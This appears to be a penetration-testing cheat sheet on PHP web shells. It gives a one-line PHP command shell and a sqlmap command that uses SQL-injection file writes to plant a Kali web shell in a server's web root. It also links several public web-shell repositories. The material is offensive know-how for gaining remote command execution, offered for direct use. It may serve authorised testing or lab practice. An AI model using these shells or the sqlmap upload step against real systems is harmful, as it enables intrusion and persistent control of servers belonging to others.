# web-shells

**wright.php (Kali)** — More stable than a minimal `?cmd=` PHP shell. Use when you can upload a single file (e.g. sqlmap `--file-write` after SQLi).

* **Location:** `/usr/share/webshells/php/wright.php`
* **Usage:** Upload to web root (e.g. `sb.php`), then open in browser. Often avoids "Cannot execute blank command" and gives cleaner output than `<?php system($_GET["cmd"]); ?>`.
* **With sqlmap:** `sqlmap -r req.req --file-write="/usr/share/webshells/php/wright.php" --file-dest="/var/www/html/sb.php" --batch`

**SecLists**

* https://github.com/danielmiessler/SecLists/tree/master/Web-Shells

**White Winter Wolf Web Shell**

* https://github.com/WhiteWinterWolf/wwwolf-php-webshell

**PHP Bash**

* https://github.com/Arrexel/phpbash.git

**PHP - Powny-Shell**

* https://github.com/flozz/p0wny-shell
